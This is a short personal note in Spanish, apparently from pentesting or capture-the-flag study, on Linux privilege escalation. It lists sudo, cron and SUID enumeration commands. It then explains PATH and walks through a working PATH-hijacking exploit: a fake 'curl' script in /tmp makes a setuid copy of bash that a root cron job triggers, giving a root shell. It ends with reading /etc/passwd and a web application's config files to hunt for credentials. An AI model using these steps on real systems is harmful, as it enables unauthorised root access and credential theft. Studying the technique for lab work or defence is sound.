# Escala privilegios

Creadas: 6 de diciembre de 2025 22:52

sudo -l

Tareas programadas:

cat /etc/crontab

PERMISOS SUID

find / -perm -4000 -ls 2>/dev/null

### **¿Qué es $PATH?**

$PATH es **una variable de entorno** que contiene **una lista de directorios** donde el sistema busca los programas/comandos cuando tú escribes algo en la terminal.

Ver tu PATH actual:   echo $PATH

Ejemplo típico de explotación: PATH hijacking”.

curl                     # compruebas que existe curl
echo $PATH               # ves el PATH actual
export PATH=/tmp:$PATH   # metes /tmp al principio del PATH

# En /etc/crontab (o en un script de root)

PATH=/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

- root curl [http://ejemplo.com/status](http://ejemplo.com/status)

YO hago

cd /tmp
cat > curl << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x curl

/tmp/rootbash -p
id

ip a

cat /etc/passwd

ver archivos de la configuracion de la web para encontrar credenciales

cd /var/www/html/traffic_offense/

cat config.php

cat initialize.php